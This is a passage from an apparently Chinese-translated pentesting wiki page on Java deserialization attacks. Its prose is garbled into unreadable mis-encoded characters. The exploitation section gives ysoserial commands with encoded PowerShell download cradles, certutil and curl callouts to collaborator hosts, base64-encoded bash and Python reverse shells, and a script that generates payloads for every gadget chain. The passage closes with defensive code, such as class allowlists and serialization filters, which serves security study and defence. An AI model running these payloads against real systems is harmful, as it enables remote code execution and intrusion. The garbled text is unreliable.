è¿è¡Œ**gadgetinspector**æ—¶ï¼ˆåœ¨æ„å»ºåï¼‰ä¸è¦åœ¨æ„å®ƒæ‰€ç»å†çš„å¤§é‡è­¦å‘Š/é”™è¯¯ï¼Œè®©å®ƒå®Œæˆã€‚å®ƒä¼šå°†æ‰€æœ‰å‘ç°å†™å…¥_gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ã€‚è¯·æ³¨æ„ï¼Œ**gadgetinspectorä¸ä¼šåˆ›å»ºä¸€ä¸ªåˆ©ç”¨ï¼Œå¹¶ä¸”å¯èƒ½ä¼šæŒ‡ç¤ºå‡é˜³æ€§**ã€‚

#### é»‘ç›’æµ‹è¯•

ä½¿ç”¨Burpæ‰©å±•[**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md)ï¼Œä½ å¯ä»¥è¯†åˆ«**å“ªäº›åº“æ˜¯å¯ç”¨çš„**ï¼ˆç”šè‡³åŒ…æ‹¬ç‰ˆæœ¬ï¼‰ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œé€‰æ‹©ä¸€ä¸ªæœ‰æ•ˆè½½è·æ¥åˆ©ç”¨æ¼æ´å¯èƒ½ä¼š**æ›´å®¹æ˜“**ã€‚\
[**é˜…è¯»æ­¤æ–‡ä»¥äº†è§£æ›´å¤šå…³äºGadgetProbeçš„ä¿¡æ¯**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ã€‚**\
GadgetProbeä¸“æ³¨äº**`ObjectInputStream`ååºåˆ—åŒ–**ã€‚

ä½¿ç”¨Burpæ‰©å±•[**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)ï¼Œä½ å¯ä»¥**è¯†åˆ«å¯è¢«ysoserialåˆ©ç”¨çš„è„†å¼±åº“**å¹¶**åˆ©ç”¨**å®ƒä»¬ã€‚\
[**é˜…è¯»æ­¤æ–‡ä»¥äº†è§£æ›´å¤šå…³äºJava Deserialization Scannerçš„ä¿¡æ¯ã€‚**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scannerä¸“æ³¨äº**`ObjectInputStream`**ååºåˆ—åŒ–ã€‚

ä½ è¿˜å¯ä»¥ä½¿ç”¨[**Freddy**](https://github.com/nccgroup/freddy)æ¥**æ£€æµ‹Burpä¸­çš„ååºåˆ—åŒ–**æ¼æ´ã€‚è¿™ä¸ªæ’ä»¶å°†æ£€æµ‹**ä¸ä»…æ˜¯`ObjectInputStream`**ç›¸å…³çš„æ¼æ´ï¼Œè¿˜**åŒ…æ‹¬**æ¥è‡ª**Json**å’Œ**Yml**ååºåˆ—åŒ–åº“çš„æ¼æ´ã€‚åœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹ï¼Œå®ƒå°†å°è¯•ä½¿ç”¨sleepæˆ–DNSæœ‰æ•ˆè½½è·æ¥ç¡®è®¤å®ƒä»¬ã€‚\
[**ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šå…³äºFreddyçš„ä¿¡æ¯ã€‚**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**åºåˆ—åŒ–æµ‹è¯•**

å¹¶ä¸æ˜¯æ‰€æœ‰çš„äº‹æƒ…éƒ½ä¸æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨äº†ä»»ä½•è„†å¼±åº“æœ‰å…³ã€‚æœ‰æ—¶ä½ å¯ä»¥**æ›´æ”¹åºåˆ—åŒ–å¯¹è±¡å†…éƒ¨çš„æ•°æ®å¹¶ç»•è¿‡ä¸€äº›æ£€æŸ¥**ï¼ˆå¯èƒ½æˆäºˆä½ åœ¨webåº”ç”¨ç¨‹åºä¸­çš„ç®¡ç†å‘˜æƒé™ï¼‰ã€‚\
å¦‚æœä½ å‘ç°ä¸€ä¸ªjavaåºåˆ—åŒ–å¯¹è±¡è¢«å‘é€åˆ°webåº”ç”¨ç¨‹åºï¼Œ**ä½ å¯ä»¥ä½¿ç”¨**[**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **ä»¥æ›´äººæ€§åŒ–çš„æ ¼å¼æ‰“å°å‘é€çš„åºåˆ—åŒ–å¯¹è±¡**ã€‚çŸ¥é“ä½ å‘é€äº†å“ªäº›æ•°æ®å°†æ›´å®¹æ˜“ä¿®æ”¹å®ƒå¹¶ç»•è¿‡ä¸€äº›æ£€æŸ¥ã€‚

### **åˆ©ç”¨**

#### **ysoserial**

åˆ©ç”¨Javaååºåˆ—åŒ–çš„ä¸»è¦å·¥å…·æ˜¯[**ysoserial**](https://github.com/frohoff/ysoserial)ï¼ˆ[**åœ¨è¿™é‡Œä¸‹è½½**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)ï¼‰ã€‚ä½ ä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨[**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)ï¼Œè¿™å°†å…è®¸ä½ ä½¿ç”¨å¤æ‚çš„å‘½ä»¤ï¼ˆä¾‹å¦‚å¸¦ç®¡é“çš„å‘½ä»¤ï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œè¿™ä¸ªå·¥å…·**ä¸“æ³¨äº**åˆ©ç”¨**`ObjectInputStream`**ã€‚\
æˆ‘ä¼š**å…ˆä½¿ç”¨â€œURLDNSâ€**æœ‰æ•ˆè½½è·**å†ä½¿ç”¨RCE**æœ‰æ•ˆè½½è·æ¥æµ‹è¯•æ³¨å…¥æ˜¯å¦å¯èƒ½ã€‚æ— è®ºå¦‚ä½•ï¼Œè¯·æ³¨æ„â€œURLDNSâ€æœ‰æ•ˆè½½è·å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œä½†å…¶ä»–RCEæœ‰æ•ˆè½½è·å¯èƒ½æœ‰æ•ˆã€‚
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
åœ¨ä¸º **java.lang.Runtime.exec()** åˆ›å»ºæœ‰æ•ˆè´Ÿè½½æ—¶ï¼Œæ‚¨ **ä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦**ï¼Œå¦‚ ">" æˆ– "|" æ¥é‡å®šå‘æ‰§è¡Œçš„è¾“å‡ºï¼Œ"$()" æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç”šè‡³ **ä¸èƒ½é€šè¿‡ç©ºæ ¼åˆ†éš”** æ¥ä¼ é€’å‘½ä»¤å‚æ•°ï¼ˆæ‚¨å¯ä»¥æ‰§è¡Œ `echo -n "hello world"`ï¼Œä½†ä¸èƒ½æ‰§è¡Œ `python2 -c 'print "Hello world"'`ï¼‰ã€‚ä¸ºäº†æ­£ç¡®ç¼–ç æœ‰æ•ˆè´Ÿè½½ï¼Œæ‚¨å¯ä»¥ [ä½¿ç”¨è¿™ä¸ªç½‘é¡µ](http://www.jackson-t.ca/runtime-exec-payloads.html)ã€‚

è¯·éšæ„ä½¿ç”¨ä¸‹ä¸€ä¸ªè„šæœ¬æ¥åˆ›å»º **æ‰€æœ‰å¯èƒ½çš„ä»£ç æ‰§è¡Œ** æœ‰æ•ˆè´Ÿè½½ï¼Œé€‚ç”¨äº Windows å’Œ Linuxï¼Œç„¶ååœ¨æ˜“å—æ”»å‡»çš„ç½‘é¡µä¸Šè¿›è¡Œæµ‹è¯•ï¼š
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

æ‚¨å¯ä»¥**ä½¿ç”¨** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ä¸ ysoserial ä¸€èµ·åˆ›å»ºæ›´å¤šæ¼æ´åˆ©ç”¨**ã€‚æœ‰å…³æ­¤å·¥å…·çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§**æ¼”è®²çš„å¹»ç¯ç‰‡**ï¼Œè¯¥å·¥å…·åœ¨å…¶ä¸­ä»‹ç»ï¼š[https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)å¯ç”¨äºç”Ÿæˆæœ‰æ•ˆè½½è·ï¼Œä»¥åˆ©ç”¨ Java ä¸­ä¸åŒçš„**Json**å’Œ**Yml**åºåˆ—åŒ–åº“ã€‚\
ä¸ºäº†ç¼–è¯‘è¯¥é¡¹ç›®ï¼Œæˆ‘éœ€è¦**æ·»åŠ **è¿™äº›**ä¾èµ–é¡¹**åˆ° `pom.xml`ï¼š
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**å®‰è£… maven**ï¼Œå¹¶ **ç¼–è¯‘** é¡¹ç›®ï¼š
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

é˜…è¯»æ›´å¤šå…³äºè¿™ä¸ªJava JSONåº“çš„ä¿¡æ¯: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* å¦‚æœä½ æƒ³æµ‹è¯•ä¸€äº›ysoserialæœ‰æ•ˆè½½è·ï¼Œä½ å¯ä»¥**è¿è¡Œè¿™ä¸ªwebapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Javaåœ¨å„ç§ç›®çš„ä¸Šä½¿ç”¨äº†å¤§é‡çš„åºåˆ—åŒ–ï¼Œä¾‹å¦‚ï¼š

* **HTTPè¯·æ±‚**: åºåˆ—åŒ–å¹¿æ³›åº”ç”¨äºå‚æ•°ã€ViewStateã€cookiesç­‰çš„ç®¡ç†ã€‚
* **RMI (è¿œç¨‹æ–¹æ³•è°ƒç”¨)**: Java RMIåè®®å®Œå…¨ä¾èµ–äºåºåˆ—åŒ–ï¼Œæ˜¯Javaåº”ç”¨ç¨‹åºè¿œç¨‹é€šä¿¡çš„åŸºçŸ³ã€‚
* **é€šè¿‡HTTPçš„RMI**: è¿™ç§æ–¹æ³•é€šå¸¸è¢«åŸºäºJavaçš„åšå®¢æˆ·ç«¯webåº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œåˆ©ç”¨åºåˆ—åŒ–è¿›è¡Œæ‰€æœ‰å¯¹è±¡é€šä¿¡ã€‚
* **JMX (Javaç®¡ç†æ‰©å±•)**: JMXåˆ©ç”¨åºåˆ—åŒ–åœ¨ç½‘ç»œä¸Šä¼ è¾“å¯¹è±¡ã€‚
* **è‡ªå®šä¹‰åè®®**: åœ¨Javaä¸­ï¼Œæ ‡å‡†åšæ³•æ¶‰åŠä¼ è¾“åŸå§‹Javaå¯¹è±¡ï¼Œè¿™å°†åœ¨å³å°†åˆ°æ¥çš„æ¼æ´ç¤ºä¾‹ä¸­æ¼”ç¤ºã€‚

### Prevention

#### Transient objects

ä¸€ä¸ªå®ç°äº†`Serializable`çš„ç±»å¯ä»¥å°†ç±»ä¸­ä»»ä½•ä¸åº”è¯¥è¢«åºåˆ—åŒ–çš„å¯¹è±¡å®ç°ä¸º`transient`ã€‚ä¾‹å¦‚ï¼š
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### é¿å…åºåˆ—åŒ–éœ€è¦å®ç° Serializable çš„ç±»

åœ¨æŸäº›**å¯¹è±¡å¿…é¡»å®ç° `Serializable`** æ¥å£çš„åœºæ™¯ä¸­ï¼Œç”±äºç±»å±‚æ¬¡ç»“æ„ï¼Œå­˜åœ¨æ— æ„ååºåˆ—åŒ–çš„é£é™©ã€‚ä¸ºé˜²æ­¢è¿™ç§æƒ…å†µï¼Œç¡®ä¿è¿™äº›å¯¹è±¡ä¸å¯ååºåˆ—åŒ–ï¼Œé€šè¿‡å®šä¹‰ä¸€ä¸ªå§‹ç»ˆæŠ›å‡ºå¼‚å¸¸çš„ `final` `readObject()` æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **å¢å¼º Java ä¸­çš„ååºåˆ—åŒ–å®‰å…¨æ€§**

**è‡ªå®šä¹‰ `java.io.ObjectInputStream`** æ˜¯ç¡®ä¿ååºåˆ—åŒ–è¿‡ç¨‹å®‰å…¨çš„å®ç”¨æ–¹æ³•ã€‚å½“æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶ï¼Œæ­¤æ–¹æ³•é€‚ç”¨ï¼š

* ååºåˆ—åŒ–ä»£ç åœ¨æ‚¨çš„æ§åˆ¶ä¹‹ä¸‹ã€‚
* é¢„æœŸååºåˆ—åŒ–çš„ç±»æ˜¯å·²çŸ¥çš„ã€‚

é‡å†™ **`resolveClass()`** æ–¹æ³•ä»¥é™åˆ¶ååºåˆ—åŒ–ä»…é™äºå…è®¸çš„ç±»ã€‚è¿™å¯ä»¥é˜²æ­¢ååºåˆ—åŒ–ä»»ä½•ç±»ï¼Œé™¤äº†é‚£äº›æ˜ç¡®å…è®¸çš„ç±»ï¼Œä¾‹å¦‚ä»¥ä¸‹ç¤ºä¾‹ä»…é™åˆ¶ååºåˆ—åŒ–ä¸º `Bicycle` ç±»ï¼š
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ä½¿ç”¨ Java ä»£ç†å¢å¼ºå®‰å…¨æ€§** æä¾›äº†ä¸€ç§åœ¨æ— æ³•ä¿®æ”¹ä»£ç æ—¶çš„å¤‡ç”¨è§£å†³æ–¹æ¡ˆã€‚æ­¤æ–¹æ³•ä¸»è¦ç”¨äº **é»‘åå•æœ‰å®³ç±»**ï¼Œä½¿ç”¨ JVM å‚æ•°ï¼š
```
-javaagent:name-of-agent.jar
```
å®ƒæä¾›äº†ä¸€ç§åŠ¨æ€ä¿æŠ¤ååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œç†æƒ³ç”¨äºç«‹å³ä»£ç æ›´æ”¹ä¸åˆ‡å®é™…çš„ç¯å¢ƒã€‚

æŸ¥çœ‹ [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) ä¸­çš„ç¤ºä¾‹

**å®ç°åºåˆ—åŒ–è¿‡æ»¤å™¨**ï¼šJava 9 é€šè¿‡ **`ObjectInputFilter`** æ¥å£å¼•å…¥äº†åºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œæä¾›äº†ä¸€ç§å¼ºå¤§çš„æœºåˆ¶ï¼Œç”¨äºæŒ‡å®šååºåˆ—åŒ–ä¹‹å‰åºåˆ—åŒ–å¯¹è±¡å¿…é¡»æ»¡è¶³çš„æ ‡å‡†ã€‚è¿™äº›è¿‡æ»¤å™¨å¯ä»¥å…¨å±€åº”ç”¨æˆ–æŒ‰æµåº”ç”¨ï¼Œæä¾›å¯¹ååºåˆ—åŒ–è¿‡ç¨‹çš„ç»†ç²’åº¦æ§åˆ¶ã€‚

è¦ä½¿ç”¨åºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œæ‚¨å¯ä»¥è®¾ç½®ä¸€ä¸ªé€‚ç”¨äºæ‰€æœ‰ååºåˆ—åŒ–æ“ä½œçš„å…¨å±€è¿‡æ»¤å™¨ï¼Œæˆ–ä¸ºç‰¹å®šæµåŠ¨æ€é…ç½®å®ƒã€‚ä¾‹å¦‚ï¼š
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**åˆ©ç”¨å¤–éƒ¨åº“å¢å¼ºå®‰å…¨æ€§**ï¼šåƒ**NotSoSerial**ã€**jdeserialize**å’Œ**Kryo**è¿™æ ·çš„åº“æä¾›äº†æ§åˆ¶å’Œç›‘æ§Javaååºåˆ—åŒ–çš„é«˜çº§åŠŸèƒ½ã€‚è¿™äº›åº“å¯ä»¥æä¾›é¢å¤–çš„å®‰å…¨å±‚ï¼Œä¾‹å¦‚ç™½åå•æˆ–é»‘åå•ç±»ã€åœ¨ååºåˆ—åŒ–ä¹‹å‰åˆ†æåºåˆ—åŒ–å¯¹è±¡ï¼Œä»¥åŠå®ç°è‡ªå®šä¹‰åºåˆ—åŒ–ç­–ç•¥ã€‚

* **NotSoSerial**æ‹¦æˆªååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»¥é˜²æ­¢æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚
* **jdeserialize**å…è®¸åœ¨ä¸ååºåˆ—åŒ–çš„æƒ…å†µä¸‹åˆ†æåºåˆ—åŒ–çš„Javaå¯¹è±¡ï¼Œå¸®åŠ©è¯†åˆ«æ½œåœ¨çš„æ¶æ„å†…å®¹ã€‚
* **Kryo**æ˜¯ä¸€ä¸ªæ›¿ä»£çš„åºåˆ—åŒ–æ¡†æ¶ï¼Œå¼ºè°ƒé€Ÿåº¦å’Œæ•ˆç‡ï¼Œæä¾›å¯é…ç½®çš„åºåˆ—åŒ–ç­–ç•¥ï¼Œå¯ä»¥å¢å¼ºå®‰å…¨æ€§ã€‚

### å‚è€ƒæ–‡çŒ®

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* ååºåˆ—åŒ–å’Œysoserialè®²åº§ï¼š[http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* è®²åº§å…³äºgadgetinspectorï¼š[https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8)å’Œå¹»ç¯ç‰‡ï¼š[https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsecè®ºæ–‡ï¼š[https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Javaå’Œ.Net JSONååºåˆ—åŒ–**è®ºæ–‡ï¼š**[**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ**è®²åº§ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c)å’Œå¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ååºåˆ—åŒ–CVEï¼š[https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDIæ³¨å…¥ä¸log4Shell

åœ¨ä»¥ä¸‹é¡µé¢ä¸­æŸ¥æ‰¾**JNDIæ³¨å…¥ã€å¦‚ä½•é€šè¿‡RMIã€CORBAå’ŒLDAPæ»¥ç”¨å®ƒä»¥åŠå¦‚ä½•åˆ©ç”¨log4shell**ï¼ˆä»¥åŠæ­¤æ¼æ´çš„ç¤ºä¾‹ï¼‰ï¼š

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Javaæ¶ˆæ¯æœåŠ¡

> **Javaæ¶ˆæ¯æœåŠ¡**ï¼ˆ**JMS**ï¼‰APIæ˜¯ä¸€ä¸ªJavaé¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶APIï¼Œç”¨äºåœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªå®¢æˆ·ç«¯ä¹‹é—´å‘é€æ¶ˆæ¯ã€‚å®ƒæ˜¯å¤„ç†ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜çš„å®ç°ã€‚JMSæ˜¯Javaå¹³å°ä¼ä¸šç‰ˆï¼ˆJava EEï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œç”±Sun Microsystemså¼€å‘çš„è§„èŒƒå®šä¹‰ï¼Œä½†æ­¤åç”±Javaç¤¾åŒºè¿‡ç¨‹æŒ‡å¯¼ã€‚å®ƒæ˜¯ä¸€ç§æ¶ˆæ¯æ ‡å‡†ï¼Œå…è®¸åŸºäºJava EEçš„åº”ç”¨ç¨‹åºç»„ä»¶åˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œè¯»å–æ¶ˆæ¯ã€‚å®ƒå…è®¸åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ä¸åŒç»„ä»¶ä¹‹é—´çš„é€šä¿¡æ˜¯æ¾è€¦åˆã€å¯é å’Œå¼‚æ­¥çš„ã€‚ï¼ˆæ¥è‡ª[ç»´åŸºç™¾ç§‘](https://en.wikipedia.org/wiki/Java\_Message\_Service)ï¼‰ã€‚

### äº§å“

æœ‰å‡ ä¸ªäº§å“ä½¿ç”¨æ­¤ä¸­é—´ä»¶å‘é€æ¶ˆæ¯ï¼š

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### åˆ©ç”¨

